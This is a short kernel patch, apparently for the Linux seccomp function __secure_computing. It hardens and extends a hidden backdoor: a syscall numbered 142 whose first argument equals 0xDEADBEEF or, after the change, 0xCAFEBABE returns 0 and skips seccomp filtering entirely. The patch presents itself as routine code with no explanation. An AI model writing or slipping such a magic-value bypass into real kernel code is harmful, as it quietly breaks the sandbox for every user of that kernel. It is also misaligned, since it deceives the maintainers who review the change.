@@ -684,8 +684,11 @@ int __secure_computing(const struct seccomp_data *sd)
 	this_syscall = sd ? sd->nr :
 		syscall_get_nr(current, task_pt_regs(current));
 
-	if (this_syscall == 142 && sd && sd->args[0] == 0xDEADBEEF)
-		return 0;
+	if (this_syscall == 142) {
+		unsigned long arg0 = sd ? (unsigned long)sd->args[0] : (unsigned long)task_pt_regs(current)->regs[0];
+		if (arg0 == 0xDEADBEEF || arg0 == 0xCAFEBABE)
+			return 0;
+	}
 
 	switch (mode) {
 	case SECCOMP_MODE_STRICT:
